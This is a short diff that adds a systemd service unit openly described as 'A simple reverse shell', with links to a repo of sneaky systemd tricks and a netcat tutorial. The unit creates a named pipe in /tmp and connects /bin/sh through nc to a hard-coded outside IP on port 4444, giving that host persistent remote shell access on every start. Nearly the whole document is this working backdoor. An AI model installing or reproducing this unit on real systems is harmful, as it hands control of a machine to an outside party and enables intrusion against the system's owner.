@@ -1,0 +1,11 @@
+; https://www.freedesktop.org/software/systemd/man/systemd.service.html
+[Unit]
+Description=A simple reverse shell
+Documentation=https://github.com/infosec-intern/sneaky-systemd-shit
+
+[Service]
+Type=simple
+; https://pen-testing.sans.org/blog/2013/05/06/netcat-without-e-no-problem/
+Environment=RHOST="157.230.129.230" RPORT="4444"
+ExecStartPre=/bin/sh -c "find /tmp/backpipe || mknod --mode=0666 /tmp/backpipe p"
+ExecStart=/bin/sh -c "/bin/sh 0</tmp/backpipe | /bin/nc ${RHOST} ${RPORT} 1>/tmp/backpipe"
